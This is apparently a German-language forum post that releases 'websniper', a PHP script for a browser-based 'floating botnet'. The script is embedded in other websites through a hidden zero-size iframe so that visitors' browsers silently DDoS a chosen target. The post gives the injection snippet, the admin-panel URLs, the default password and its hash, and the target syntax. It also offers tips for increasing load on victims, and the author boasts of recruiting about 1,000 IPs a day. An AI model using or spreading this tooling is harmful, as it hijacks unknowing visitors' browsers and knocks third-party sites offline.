websniper
=========
hier mal ein script fuer schwebende botnetze. aehnlich wie man es von xss shells kennt, nur halt fuer ddos.
man kann dieses script bei anderen websiten einbinden und folglich dessen besucher fuer ddos missbrauchen.
es arbeitet mit dem img onload eventhandler und dem laden einer xml datei. beides zeigt, bei dem richtigen
browser, keine ladeaktion an, wenn also ein ddos angriff gestartet wird, dann zeigt der browser des opfers
nicht an das gerade etwas laed, es laeuft also komplett im hintergrund. welche methode bei welchem browser
eingesetzt wird entscheidet natuerlich das script selbst und individuell.

getestet hab ichs mit:
internet explorer
opera
firefox
safari
rekonq
google chrome

![](http://s7.directupload.net/images/140926/g9i8v93g.png)
das script hab ich speziell fuer ddos angriffe gebastelt, allerdings nutz ichs imo fuer ganz andere dinge XD
der eigentliche sinn des scripts war es heraus zu bekommen, ob man mit einem schwebenden botnet auch mit
halbwegs normalen besucherzahlen etwas anfangen kann. das ergebenis war das ich mir ein botnet mit ~1k ip's
pro tag aufgebaut hab... dazu haben schon wenige seiten (mit iframe versehen) ausgereicht. der traffic den man
bei einem ddos angriff mittels der website besucher verursachen konnte war ebenfalls vollkommen ausreichend Smile

dementsprechend pub ich das script jetzt einfach mal. vllt. brauchts ja jemand oder kann was damit anfangen...

eingefuegt wird das script mittels des getparameters "z". bsp:
Code:
```
http://website/web-sniper/web-sniper.php?z
```
code bsp:
Code:
```
<iframe src="http://website/web-sniper/web-sniper.php?z" width="0" height="0" style="opacity: 0;"></iframe>
```
in den adminpanel gelangt man wiederum ganz einfach mit dem bloßen aufruf der website, also:
Code:
```
http://website/web-sniper/web-sniper.php
```
oder auch mit dem getparam "root":
Code:
```
http://website/web-sniper/web-sniper.php?root
```
das standart passwort ist "test123". wer dieses aendern moechte kann das an folgender codezeile machen (md5):
Code:
```
$password="cc03e747a6afbbcbf8be7668acfebee5"; //standart: test123
```
moechte man ein ziel setzen dann gibt man dieses nicht direkt als normalen link sondern ohne http und mit angabe eines ports an.
also z.b. anstatt:
Code:
```
http://unnex.de/index.php?kontakt
```
setzt man:
Code:
```
unnex.de:80/index.php?kontakt
```
einen ordnerpfad muss man nicht angeben, kann man aber. manchmal kann es stark zur belastung des ziels beitragen einen link zu einer großen datei oder z.b. suchanfrage an zu geben...

neben dem input fuer die addr findet sich eine weiteres. in diesem legt man fest wieviele threads bzw. frames pro aufruf genutzt werden sollen. frame allein ist schon ein uebler angriff. jeder weitere waere vereinfacht gesagt, so als wuerde das opfer die seite nochmal und nochmal und nochmal usw... oeffnen. hier sollte man die grenzen seiner vics also schon etwas beruecksichtigen ;-)

...die reloadzeit fuer die opfer ist im standard auf 10min gesetzt.
